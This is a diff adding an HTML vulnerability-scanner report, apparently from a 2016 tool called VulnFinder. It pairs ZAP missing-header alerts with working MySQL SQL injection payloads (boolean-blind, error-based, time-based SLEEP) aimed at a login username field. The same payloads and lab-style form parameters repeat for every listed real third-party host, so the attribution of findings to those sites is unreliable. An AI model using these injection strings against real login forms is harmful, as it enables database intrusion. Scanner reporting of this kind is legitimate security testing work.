@@ -1,0 +1,117 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"></meta><title>VulnFinder Report</title><script type="javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script><script type="javascript" src="https://code.jquery.com/jquery-3.0.0.min.js" integrity="sha256-JmvOoLtYsmqlsWxa7mDSLMwa6dZ9rrIdtrrVYRnDRH0=" crossorigin="anonymous"></script><style type="text/css">.siteurl {
+            font-family: monospace;
+        }</style><script type="javascript">$(function () {
+            $("#site1").load("site.html");
+        });</script><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" type="text/css"></link></head><body><div class="jumbotron"><div class="row"><div class="col-md-3"><img alt="Logo" src="loguito.png"></div><div class="col-md-9"><h1>VulnFinder Report</h1><p>Generated at 12/07/2016 - 02:19:54</p></div></div></div><div class="container"><div class="site"><h1>Site: <span class="siteurl">http://b.scorecardresearch.com</span></h1><table class="table"><thead class="thead-default"><th>Type</th><th>Title</th><th>Payload</th></thead><tbody><tr><th colspan="3">Field: username	Method: POST</th><tr><td>boolean-based blind</td><td>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' RLIKE (SELECT (CASE WHEN (6781=6781) THEN 0x707275656261 ELSE 0x28 END))-- WFlK&password=123&login-php-submit-button=Login</td></tr><tr><td>error-based</td><td>MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' AND (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(3367=3367,1))),0x71717a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VcpB&password=123&login-php-submit-button=Login</td></tr><tr><td>AND/OR time-based blind</td><td>MySQL >= 5.0.12 AND time-based blind (SELECT)</td><td>username=prueba' AND (SELECT * FROM (SELECT(SLEEP(5)))ilWB)-- cCLL&password=123&login-php-submit-button=Login</td></tr></tr></tbody></table></div><div class="site"><h1>Site: <span class="siteurl">http://i.stack.imgur.com</span></h1><table class="table"><thead class="thead-default"><th>Type</th><th>Title</th><th>Payload</th></thead><tbody><tr><th colspan="3">Field: username	Method: POST</th><tr><td>boolean-based blind</td><td>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' RLIKE (SELECT (CASE WHEN (6781=6781) THEN 0x707275656261 ELSE 0x28 END))-- WFlK&password=123&login-php-submit-button=Login</td></tr><tr><td>error-based</td><td>MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' AND (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(3367=3367,1))),0x71717a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VcpB&password=123&login-php-submit-button=Login</td></tr><tr><td>AND/OR time-based blind</td><td>MySQL >= 5.0.12 AND time-based blind (SELECT)</td><td>username=prueba' AND (SELECT * FROM (SELECT(SLEEP(5)))ilWB)-- cCLL&password=123&login-php-submit-button=Login</td></tr></tr></tbody></table></div><div class="site"><h1>Site: <span class="siteurl">http://stackoverflow.com</span></h1><h1>Site alerts</h1><ul><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		Cross-Domain JavaScript Source File Inclusion
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	The page includes one or more script files from a third-party domain.
+Confidence:	2
+Solution:	Ensure JavaScript source files are loaded from only trusted sources, and the sources can't be controlled by end users of the application.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		Web Browser XSS Protection Not Enabled
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	Web Browser XSS Protection is not enabled, or is disabled by the configuration of the 'X-XSS-Protection' HTTP response header on the web server
+Confidence:	2
+Solution:	Ensure that the web browser's XSS filter is enabled, by setting the X-XSS-Protection HTTP response header to '1'.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		X-Content-Type-Options Header Missing
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
+Confidence:	2
+Solution:	Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
+}</li></ul><table class="table"><thead class="thead-default"><th>Type</th><th>Title</th><th>Payload</th></thead><tbody><tr><th colspan="3">Field: username	Method: POST</th><tr><td>boolean-based blind</td><td>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' RLIKE (SELECT (CASE WHEN (6781=6781) THEN 0x707275656261 ELSE 0x28 END))-- WFlK&password=123&login-php-submit-button=Login</td></tr><tr><td>error-based</td><td>MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' AND (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(3367=3367,1))),0x71717a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VcpB&password=123&login-php-submit-button=Login</td></tr><tr><td>AND/OR time-based blind</td><td>MySQL >= 5.0.12 AND time-based blind (SELECT)</td><td>username=prueba' AND (SELECT * FROM (SELECT(SLEEP(5)))ilWB)-- cCLL&password=123&login-php-submit-button=Login</td></tr></tr></tbody></table></div><div class="site"><h1>Site: <span class="siteurl">http://api.mixpanel.com</span></h1><h1>Site alerts</h1><ul><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		Web Browser XSS Protection Not Enabled
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	Web Browser XSS Protection is not enabled, or is disabled by the configuration of the 'X-XSS-Protection' HTTP response header on the web server
+Confidence:	2
+Solution:	Ensure that the web browser's XSS filter is enabled, by setting the X-XSS-Protection HTTP response header to '1'.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		X-Content-Type-Options Header Missing
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
+Confidence:	2
+Solution:	Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		X-Frame-Options Header Not Set
+Risk:		Risk{code=2, description=Medium (Medium)}
+Description:	X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks.
+Confidence:	2
+Solution:	Most modern Web browsers support the X-Frame-Options HTTP header. Ensure it's set on all web pages returned by your site (if you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY.  ALLOW-FROM allows specific websites to frame the web page in supported web browsers).
+}</li></ul><table class="table"><thead class="thead-default"><th>Type</th><th>Title</th><th>Payload</th></thead><tbody><tr><th colspan="3">Field: username	Method: POST</th><tr><td>boolean-based blind</td><td>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' RLIKE (SELECT (CASE WHEN (6781=6781) THEN 0x707275656261 ELSE 0x28 END))-- WFlK&password=123&login-php-submit-button=Login</td></tr><tr><td>error-based</td><td>MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' AND (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(3367=3367,1))),0x71717a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VcpB&password=123&login-php-submit-button=Login</td></tr><tr><td>AND/OR time-based blind</td><td>MySQL >= 5.0.12 AND time-based blind (SELECT)</td><td>username=prueba' AND (SELECT * FROM (SELECT(SLEEP(5)))ilWB)-- cCLL&password=123&login-php-submit-button=Login</td></tr></tr></tbody></table></div><div class="site"><h1>Site: <span class="siteurl">http://app.empiric.us</span></h1><table class="table"><thead class="thead-default"><th>Type</th><th>Title</th><th>Payload</th></thead><tbody><tr><th colspan="3">Field: username	Method: POST</th><tr><td>boolean-based blind</td><td>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' RLIKE (SELECT (CASE WHEN (6781=6781) THEN 0x707275656261 ELSE 0x28 END))-- WFlK&password=123&login-php-submit-button=Login</td></tr><tr><td>error-based</td><td>MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' AND (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(3367=3367,1))),0x71717a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VcpB&password=123&login-php-submit-button=Login</td></tr><tr><td>AND/OR time-based blind</td><td>MySQL >= 5.0.12 AND time-based blind (SELECT)</td><td>username=prueba' AND (SELECT * FROM (SELECT(SLEEP(5)))ilWB)-- cCLL&password=123&login-php-submit-button=Login</td></tr></tr></tbody></table></div><div class="site"><h1>Site: <span class="siteurl">http://cdn.mxpnl.com</span></h1><h1>Site alerts</h1><ul><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		Web Browser XSS Protection Not Enabled
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	Web Browser XSS Protection is not enabled, or is disabled by the configuration of the 'X-XSS-Protection' HTTP response header on the web server
+Confidence:	2
+Solution:	Ensure that the web browser's XSS filter is enabled, by setting the X-XSS-Protection HTTP response header to '1'.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		X-Content-Type-Options Header Missing
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
+Confidence:	2
+Solution:	Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		X-Frame-Options Header Not Set
+Risk:		Risk{code=2, description=Medium (Medium)}
+Description:	X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks.
+Confidence:	2
+Solution:	Most modern Web browsers support the X-Frame-Options HTTP header. Ensure it's set on all web pages returned by your site (if you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY.  ALLOW-FROM allows specific websites to frame the web page in supported web browsers).
+}</li></ul><table class="table"><thead class="thead-default"><th>Type</th><th>Title</th><th>Payload</th></thead><tbody><tr><th colspan="3">Field: username	Method: POST</th><tr><td>boolean-based blind</td><td>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' RLIKE (SELECT (CASE WHEN (6781=6781) THEN 0x707275656261 ELSE 0x28 END))-- WFlK&password=123&login-php-submit-button=Login</td></tr><tr><td>error-based</td><td>MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' AND (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(3367=3367,1))),0x71717a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VcpB&password=123&login-php-submit-button=Login</td></tr><tr><td>AND/OR time-based blind</td><td>MySQL >= 5.0.12 AND time-based blind (SELECT)</td><td>username=prueba' AND (SELECT * FROM (SELECT(SLEEP(5)))ilWB)-- cCLL&password=123&login-php-submit-button=Login</td></tr></tr></tbody></table></div><div class="site"><h1>Site: <span class="siteurl">http://clc.stackoverflow.com</span></h1><h1>Site alerts</h1><ul><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		Web Browser XSS Protection Not Enabled
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	Web Browser XSS Protection is not enabled, or is disabled by the configuration of the 'X-XSS-Protection' HTTP response header on the web server
+Confidence:	2
+Solution:	Ensure that the web browser's XSS filter is enabled, by setting the X-XSS-Protection HTTP response header to '1'.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		X-Content-Type-Options Header Missing
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
+Confidence:	2
+Solution:	Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		X-Frame-Options Header Not Set
+Risk:		Risk{code=2, description=Medium (Medium)}
+Description:	X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks.
+Confidence:	2
+Solution:	Most modern Web browsers support the X-Frame-Options HTTP header. Ensure it's set on all web pages returned by your site (if you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY.  ALLOW-FROM allows specific websites to frame the web page in supported web browsers).
+}</li></ul><table class="table"><thead class="thead-default"><th>Type</th><th>Title</th><th>Payload</th></thead><tbody><tr><th colspan="3">Field: username	Method: POST</th><tr><td>boolean-based blind</td><td>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' RLIKE (SELECT (CASE WHEN (6781=6781) THEN 0x707275656261 ELSE 0x28 END))-- WFlK&password=123&login-php-submit-button=Login</td></tr><tr><td>error-based</td><td>MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' AND (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(3367=3367,1))),0x71717a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VcpB&password=123&login-php-submit-button=Login</td></tr><tr><td>AND/OR time-based blind</td><td>MySQL >= 5.0.12 AND time-based blind (SELECT)</td><td>username=prueba' AND (SELECT * FROM (SELECT(SLEEP(5)))ilWB)-- cCLL&password=123&login-php-submit-button=Login</td></tr></tr></tbody></table></div><div class="site"><h1>Site: <span class="siteurl">http://engine.adzerk.net</span></h1><h1>Site alerts</h1><ul><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		Cookie No HttpOnly Flag
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	A cookie has been set without the HttpOnly flag, which means that the cookie can be accessed by JavaScript. If a malicious script can be run on this page then the cookie will be accessible and can be transmitted to another site. If this is a session cookie then session hijacking may be possible.
+Confidence:	2
+Solution:	Ensure that the HttpOnly flag is set for all cookies.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		Web Browser XSS Protection Not Enabled
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	Web Browser XSS Protection is not enabled, or is disabled by the configuration of the 'X-XSS-Protection' HTTP response header on the web server
+Confidence:	2
+Solution:	Ensure that the web browser's XSS filter is enabled, by setting the X-XSS-Protection HTTP response header to '1'.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		X-Content-Type-Options Header Missing
+Risk:		Risk{code=1, description=Low (Medium)}
+Description:	The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
+Confidence:	2
+Solution:	Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
+}</li><li>Alert{
+Analyzer:	ZAP Analyzer
+Alert:		X-Frame-Options Header Not Set
+Risk:		Risk{code=2, description=Medium (Medium)}
+Description:	X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks.
+Confidence:	2
+Solution:	Most modern Web browsers support the X-Frame-Options HTTP header. Ensure it's set on all web pages returned by your site (if you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY.  ALLOW-FROM allows specific websites to frame the web page in supported web browsers).
+}</li></ul><table class="table"><thead class="thead-default"><th>Type</th><th>Title</th><th>Payload</th></thead><tbody><tr><th colspan="3">Field: username	Method: POST</th><tr><td>boolean-based blind</td><td>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' RLIKE (SELECT (CASE WHEN (6781=6781) THEN 0x707275656261 ELSE 0x28 END))-- WFlK&password=123&login-php-submit-button=Login</td></tr><tr><td>error-based</td><td>MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' AND (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(3367=3367,1))),0x71717a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VcpB&password=123&login-php-submit-button=Login</td></tr><tr><td>AND/OR time-based blind</td><td>MySQL >= 5.0.12 AND time-based blind (SELECT)</td><td>username=prueba' AND (SELECT * FROM (SELECT(SLEEP(5)))ilWB)-- cCLL&password=123&login-php-submit-button=Login</td></tr></tr></tbody></table></div><div class="site"><h1>Site: <span class="siteurl">http://pixel.quantserve.com</span></h1><table class="table"><thead class="thead-default"><th>Type</th><th>Title</th><th>Payload</th></thead><tbody><tr><th colspan="3">Field: username	Method: POST</th><tr><td>boolean-based blind</td><td>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' RLIKE (SELECT (CASE WHEN (6781=6781) THEN 0x707275656261 ELSE 0x28 END))-- WFlK&password=123&login-php-submit-button=Login</td></tr><tr><td>error-based</td><td>MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</td><td>username=prueba' AND (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(3367=3367,1))),0x71717a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VcpB&password=123&login-php-submit-button=Login</td></tr><tr><td>AND/OR time-based blind</td><td>MySQL >= 5.0.12 AND time-based blind (SELECT)</td><td>username=prueba' AND (SELECT * FROM (SELECT(SLEEP(5)))ilWB)-- cCLL&password=123&login-php-submit-button=Login</td></tr></tr></tbody></table></div></div></body></html>
